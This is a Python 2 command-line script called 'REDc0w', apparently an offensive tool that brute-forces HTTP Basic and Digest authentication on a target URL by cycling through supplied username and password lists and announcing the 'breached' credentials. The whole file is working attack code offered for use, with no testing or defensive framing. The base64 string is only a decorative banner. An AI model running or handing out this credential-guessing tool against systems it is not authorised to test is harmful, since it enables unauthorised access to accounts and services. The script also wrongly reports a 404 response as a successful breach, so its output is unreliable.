#!/usr/bin/python2

# REDc0w

import requests
import argparse
import os.path
import base64
import sys
import re

from requests.auth import HTTPDigestAuth

class HTTP_Auth_Attack(object):

    def __init__(self, target, userlist, passlist):
        self.target = target
        self.userlist = self.__parse_list(userlist)
        self.passlist = self.__parse_list(passlist)
        self.attempts = 0

    def __parse_list(self, x):
        if os.path.isfile(x): return ([line.rstrip('\n') for line in open(x)])
        else: return list([x])

    def __motd(self):
        data00 = "G1s5Mm0NCg0KICBfICAgICAgXyAgICAgICAgIF8gICAgICAgICAgICAgICAgICBfICAgICAgICAgXyAgICAgICAgICAgIF8gICAgICAgICAgICAgXyAgICAgIA0KL18vXCAgICAvXCBcICAgICAvIC9cICAgICAgICAgICAgICAgIC9cIFwgICAgICAvIC9cICAgICAgICAgL1wgXCAgICAgICAgIC9cIFwgICAgIA0KXCBcIFwgICBcIFxfXCAgIC8gLyAgXCAgICAgICAgICAgICAgLyAgXCBcICAgIC8gLyAgXCAgICAgICAvICBcIFwgICAgICAgLyAgXCBcICAgIA0KIFwgXCBcX18vIC8gLyAgLyAvIC9cIFwgICAgICAgICAgICAvIC9cIFwgXCAgLyAvIC9cIFxfXyAgIC8gL1wgXCBcICAgICAvIC9cIFwgXCAgIA0KICBcIFxfXyBcL18vICAvIC8gL1wgXCBcICAgICAgICAgIC8gLyAvXCBcX1wvIC8gL1wgXF9fX1wgLyAvIC9cIFxfXCAgIC8gLyAvXCBcIFwgIA0KICAgXC9fL1xfXy9cIC9fLyAvICBcIFwgXCAgICAgICAgLyAvXy9fIFwvXy9cIFwgXCBcL19fXy8vIC9fL18gXC9fLyAgLyAvIC8gIFwgXF9cIA0KICAgIF8vXC9fX1wgXFwgXCBcICAgXCBcIFwgICAgICAvIC9fX19fL1wgICAgXCBcIFwgICAgIC8gL19fX18vXCAgICAvIC8gLyAgICBcL18vIA0KICAgLyBfL18vXCBcIFxcIFwgXCAgIFwgXCBcICAgIC8gL1xfX19fXC9fICAgIFwgXCBcICAgLyAvXF9fX19cLyAgIC8gLyAvICAgICAgICAgIA0KICAvIC8gLyAgIFwgXCBcXCBcIFxfX19cIFwgXCAgLyAvIC8gICAgIC9fL1xfXy8gLyAvICAvIC8gL19fX19fXyAgLyAvIC9fX19fX19fXyAgIA0KIC8gLyAvICAgIC9fLyAvIFwgXC9fX19fXCBcIFwvIC8gLyAgICAgIFwgXC9fX18vIC8gIC8gLyAvX19fX19fX1wvIC8gL19fX19fX19fX1wgIA0KIFwvXy8gICAgIFxfXC8gICBcX19fX19fX19fXC9cL18vICAgICAgICBcX19fX19cLyAgIFwvX19fX19fX19fXy9cL19fX19fX19fX19fXy8gIA0KDQobWzBtDQobWzkxbSAgICAgICAgICAgICAgICAgW1JFRENPVzogaHR0cCBhdXRoZW50aWNhdGlvbiBicnV0ZWZvcmNlIHRvb2xdDQobWzBtDQogICAgICAgICAgICAgICAgICAgICAgIGJ5OiAweDY0NjQ1ZkBwcm90b25tYWlsLmNvbQ0KDQo="
        print(base64.b64decode(data00))
        print("[*] - Sending initial request to URL '%s'\n") % (self.target)
        print("[*] - Checking for authentication...\n")

    def init_attack(self):
        self.__motd()
        try:
            r = requests.get(self.target)
        except requests.exceptions.RequestException:
            print("\t--> [\033[91mx\033[0m] - '\033[91mConnection Refused\033[0m' received from '%s'. Exiting.\n") % (self.target)
            sys.exit(2)
        else:
            if not r.status_code == 401:
                print("\t--> [\033[91mx\033[0m] - '%s' did not reply with http authentication challange (\033[91mno 401 response\033[0m).\n") % (self.target)
                sys.exit(2)
            elif r.status_code == 401:
                print("\t--> [\033[92m!\033[0m] HTTP Authentication Detected!\n")

                http_auth_string = r.headers['www-authenticate']
                http_auth_objects = re.compile(r'''(?:\s*www-authenticate\s*:)?\s*(\w*)\s+realm=['"]([^'"]+)['"]''', re.IGNORECASE)
                http_match_object = http_auth_objects.match(http_auth_string)
                http_auth_scheme = http_match_object.group(1)
                http_auth_realm = http_match_object.group(2)

                if not http_auth_scheme:
                    print("\t--> [\033[91mx\033[0m] - '\033[91mError trying to determine auth scheme\033[0m' from '%s'. Exiting.\n") % (self.target)
                    sys.exit(2)
                elif http_auth_scheme.lower() == 'basic':
                    for _user in self.userlist:
                        for _pass in self.passlist:
                            self.basic_auth(_user, _pass)
                    print '\n'
                    print("\t--> [?] - Sorry... could not find a successful username/password combination.\n")

                elif http_auth_scheme.lower() == 'digest':
                    for _user in self.userlist:
                        for _pass in self.passlist:
                            self.digest_auth(_user, _pass)
                    print '\n'
                    print("\t--> [?] - Sorry... could not find a successful username/password combination.\n")

                if not http_auth_realm:
                    print("\t--> [\033[91mx\033[0m] - '\033[91mError trying to determine auth realm\033[0m' from '%s'. Exiting.\n") % (self.target)
                    sys.exit(2)
                else:
                    print "Return:" + str(r.status_code)


    #Basic Auth
    def basic_auth(self, _user, _pass):
        basic_r = requests.post(self.target, auth=(_user, _pass))
        self.attempts += 1
        print("\t--> [\033[92m!\033[0m] Attempting Breach with user:\033[;1m%10s\033[0m and password:\033[;1m %15s\033[0m\033[1A") % (_user, _pass)
        if basic_r.status_code == 200:
            print '\n'
            print("\r\t-----> [\033[92m!\033[0m] \033[;1m\033[92mSUCCESS!\033[0m HTTP Authentication Scheme BREACHED after %d attempts!\n") % (self.attempts)
            print("\t-----> [\033[92m!\033[0m]\033[;1m Username: '%s'\n\n\t\033[0m-----> [\033[92m!\033[0m]\033[;1m Password: '%s'\033[0m\n") % (_user, _pass)
            sys.exit(1)
        elif basic_r.status_code == 404:
            print '\n'
            print("\r\t-----> [\033[92m!\033[0m] \033[;1m\033[92mSUCCESS!\033[0m HTTP Authentication Scheme BREACHED after %d attempts!\n") % (self.attempts)
            print("\t-----> [\033[91mx\033[0m] \033[91mFile Not Found Error\033[0m from '%s'.\n") % (self.target)
            sys.exit(1)
        else:
            pass

    #Digest Auth
    def digest_auth(self, _user, _pass):
        digest_r = requests.post(self.target, auth=HTTPDigestAuth(_user, _pass))
        self.attempts += 1
        print("\t--> [\033[92m!\033[0m] Attempting Breach with user:\033[;1m%10s\033[0m and password:\033[;1m %15s\033[0m\033[1A") % (_user, _pass)
        if digest_r.status_code == 200:
            print '\n'
            print("\r\t-----> [\033[92m!\033[0m] \033[;1m\033[92mSUCCESS!\033[0m HTTP Authentication Scheme BREACHED after %d attempts!\n") % (self.attempts)
            print("\t-----> [\033[92m!\033[0m]\033[;1m Username: '%s'\n\n\t\033[0m-----> [\033[92m!\033[0m]\033[;1m Password: '%s'\033[0m\n") % (_user, _pass)
            sys.exit(1)
        elif digest_r.status_code == 404:
            print '\n'
            print("\r\t-----> [\033[92m!\033[0m] \033[;1m\033[92mSUCCESS!\033[0m HTTP Authentication Scheme BREACHED after %d attempts!\n") % (self.attempts)
            print("\t-----> [\033[91mx\033[0m] \033[91mFile Not Found Error\033[0m from '%s'.\n") % (self.target)
            sys.exit(1)
        else:
            pass



if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    auth_group = parser.add_argument_group("Required Arguments")
    auth_group.add_argument('-t', required="true", dest="target", help="Target URL running Web Authentication")
    auth_group.add_argument('-u', required="true", dest="userlist", help="A username or a file containing a list of users")
    auth_group.add_argument('-p', required="true", dest="passlist", help="A password or a file containing a list of passwords")
    args = parser.parse_args()

    HAA = HTTP_Auth_Attack(args.target, args.userlist, args.passlist)
    HAA.init_attack()